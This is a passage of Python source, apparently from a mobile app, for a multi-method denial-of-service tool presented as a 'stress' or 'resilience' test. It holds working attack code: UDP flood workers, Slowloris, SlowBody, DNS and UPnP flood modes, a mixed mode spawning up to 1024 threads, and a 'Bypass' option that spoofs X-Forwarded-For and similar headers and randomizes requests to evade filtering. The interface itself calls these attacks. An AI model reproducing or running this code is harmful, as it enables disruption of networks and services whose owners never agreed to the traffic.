    def _open_mixed_settings(self):
        self.navigate("mixed_settings")

    def _set_mixed_setting(self, key, value):
        val = bool(value)
        if key == "mixed_udp":
            self.mixed_udp = val
        elif key == "mixed_connect":
            self.mixed_connect = val
        elif key == "mixed_http":
            self.mixed_http = val
        elif key == "mixed_hold":
            self.mixed_hold = val
        elif key == "mixed_slowloris":
            self.mixed_slowloris = val
        elif key == "mixed_slowbody":
            self.mixed_slowbody = val
        elif key == "mixed_upnp":
            self.mixed_upnp = val
        elif key == "mixed_dns":
            self.mixed_dns = val
        elif key == "mixed_l2":
            self.mixed_l2 = val
        else:
            return
        self.set_setting(key, val)
        self.refresh()

    def _set_method(self, method):
        if method == "L2 (Root)" and not (self.has_root or self.has_shizuku):
            self.toast("❌ This method requires Root or Shizuku!")
            return
        self.method = method
        self.set_setting("method", method)
        self.refresh()

    def _set_gateway(self, value):
        self.gateway = value.strip()
        self.set_setting("gateway", self.gateway)

    def _set_port(self, value):
        try:
            p = int(value)
            if 1 <= p <= 65535:
                self.port = p
                self.set_setting("port", self.port)
        except Exception:
            pass

    def _set_udp_threads(self, value):
        self.udp_threads = max(16, min(1024, int(value)))
        self.set_setting("udp_threads", self.udp_threads)
        self.refresh()

    def _set_tcp_threads(self, value):
        self.tcp_threads = max(4, min(128, int(value)))
        self.set_setting("tcp_threads", self.tcp_threads)
        self.refresh()

    def _set_duration(self, value):
        try:
            d = int(value)
            if d >= 0:
                self.duration = d
                self.set_setting("duration", self.duration)
                self.refresh()
        except Exception:
            pass

    def _set_throttle(self, value):
        self.throttle_ignore = bool(value)
        self.set_setting("throttle_ignore", self.throttle_ignore)
        self.refresh()

    def _set_bypass_mode(self, value):
        self.bypass_mode = bool(value)
        self.set_setting("bypass_mode", self.bypass_mode)
        self.refresh()

    def _get_evasion_request_parts(self):
        if not self.bypass_mode:
            req = f"GET / HTTP/1.1\r\nHost: {self.gateway}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode()
            return [req]

        method = random.choice(["GET", "POST", "HEAD"])
        base_path = random.choice(HTTP_PATHS)
        path = f"{base_path}?_nc={random.randint(10000, 99999)}&t={int(time.time())}"
        fake_ip = f"192.168.1.{random.randint(2, 254)}"
        ua = generate_random_user_agent()

        header_pool = [
            f"X-Forwarded-For: {fake_ip}",
            f"Client-IP: {fake_ip}",
            f"X-Real-IP: {fake_ip}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8",
            "Cache-Control: no-cache, no-store, must-revalidate",
            "Pragma: no-cache",
            f"Cookie: session_id={os.urandom(8).hex()}",
            "Sec-CH-UA-Mobile: ?0",
            "Connection: close"
        ]
        random.shuffle(header_pool)

        part1 = f"{method} {path} HTTP/1.1\r\nHost: {self.gateway}\r\nUser-Agent: {ua}\r\n".encode()
        part2 = ("\r\n".join(header_pool) + "\r\n\r\n").encode()
        return [part1, part2]

    def _toggle_stress(self):
        if self.running:
            self._stop_stress()
        else:
            self._start_stress()

    def _start_stress(self):
        if self.running:
            return

        if self.method == "L2 (Root)" and not (self.has_root or self.has_shizuku):
            self.toast("❌ L2 requires Root or Shizuku!")
            self._log("L2 rejected: no privileges", "ERR")
            return

        self.running = True
        self.stop_flag = False
        self.time_left = self.duration
        self.pps = 0
        self.vitality_status = "Resilience measurement in progress..."
        with self.stats_lock:
            self.stats = {"http": 0, "connect": 0, "hold": 0, "udp": 0, "upnp": 0, "dns": 0, "l2": 0}
        self.threads = []
        self.sockets = []

        dur_str = f"{self.duration} sec" if self.duration > 0 else "∞ (infinite)"
        bypass_str = " [🛡️ Bypass 3.0 ON]" if self.bypass_mode else ""

        threading.Thread(target=self._ui_and_timer_loop, daemon=True).start()
        threading.Thread(target=self._vitality_monitor_loop, daemon=True).start()

        if self.method == "Mixed":
            tcp_methods = self._get_mixed_tcp_methods()
            udp_methods = self._get_mixed_udp_methods()

            if not tcp_methods and not udp_methods:
                self.toast("❌ Select at least one attack in Mixed!")
                self._stop_stress()
                return

            self._log(f"▶️ Mixed start{bypass_str} (TCP threads: {self.tcp_threads}, UDP threads: {self.udp_threads}) on {self.gateway}:{self.port}", "OK")

            if tcp_methods:
                threading.Thread(target=self._spawn_workers_async, args=(self._mixed_tcp_worker, self.tcp_threads), daemon=True).start()
            if udp_methods:
                threading.Thread(target=self._spawn_workers_async, args=(self._mixed_udp_worker, self.udp_threads), daemon=True).start()

            self.toast(f"✅ Starting Mixed ({self.tcp_threads} TCP + {self.udp_threads} UDP)")
        else:
            method_map = {
                "UDP": self._udp_worker,
                "CONNECT": self._connect_worker,
                "HTTP": self._http_worker,
                "Hold": self._hold_worker,
                "Slowloris": self._slowloris_worker,
                "SlowBody": self._slowbody_worker,
                "UPnP XML": self._upnp_worker,
                "DNS Flood": self._dns_worker,
                "L2 (Root)": self._l2_worker
            }
            worker = method_map.get(self.method, self._udp_worker)
            is_tcp_single = (self.method in ["CONNECT", "HTTP", "Hold", "Slowloris", "SlowBody"])
            threads_to_spawn = self.tcp_threads if is_tcp_single else self.udp_threads

            self._log(f"▶️ {self.method} start{bypass_str} ({threads_to_spawn} threads, {dur_str}) on {self.gateway}:{self.port}", "OK")
            threading.Thread(target=self._spawn_workers_async, args=(worker, threads_to_spawn), daemon=True).start()
            self.toast(f"✅ Starting {self.method} ({threads_to_spawn} threads)")

        self.refresh()

    def _spawn_workers_async(self, worker, target_count):
        for i in range(target_count):
            if self.stop_flag:
                break
            try:
                t = threading.Thread(target=worker, args=(i,), daemon=True)
                t.start()
                self.threads.append(t)
            except Exception as e:
                self._record_error("ThreadSpawn", e)
                break
            if i % 30 == 0:
                time.sleep(0.002)

    def _stop_stress(self):
        if not self.running and not self.stop_flag:
            return
        self.stop_flag = True
        self.running = False
        self.pps = 0
        self._log(f"⏹ Stopping... Final: {self.stats}", "INFO")

        def cleanup_worker():
            with self.sockets_lock:
                for sock in list(self.sockets):
                    self._safe_close_socket(sock)
                self.sockets.clear()
            self.threads.clear()
            self._log("All resources released", "OK")
            self.refresh()

        threading.Thread(target=cleanup_worker, daemon=True).start()
        self.refresh()
        self.toast("⏹ Stopped")

    def _udp_worker(self, idx):
        target = (self.gateway, self.port)
        sock = None

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(False)
            with self.sockets_lock:
                self.sockets.append(sock)
        except Exception as e:
            self._record_error("UDP_Init", e)
            return

        local_sent = 0
        batch_size = 30

        while not self.stop_flag:
            try:
                for _ in range(batch_size):
                    if self.bypass_mode or self.port == 53:
                        pkt = random.choice([build_random_dns_query(), JUNK_PAYLOADS[0]])
                    else:
                        pkt = random.choice(JUNK_PAYLOADS)

                    try:
                        sock.sendto(pkt, target)
                        local_sent += 1
                    except (BlockingIOError, socket.error):
                        time.sleep(0.001)
                        break

                with self.stats_lock:
                    self.stats["udp"] += local_sent
                local_sent = 0

                if not self.throttle_ignore:
                    time.sleep(0.002)
            except Exception as e:
                if idx == 0 and random.random() < 0.05:
                    self._record_error("UDP", e)
                time.sleep(0.01)
                break

        if local_sent > 0:
            with self.stats_lock:
                self.stats["udp"] += local_sent

        self._safe_close_socket(sock)
        with self.sockets_lock:
            if sock in self.sockets:
                self.sockets.remove(sock)

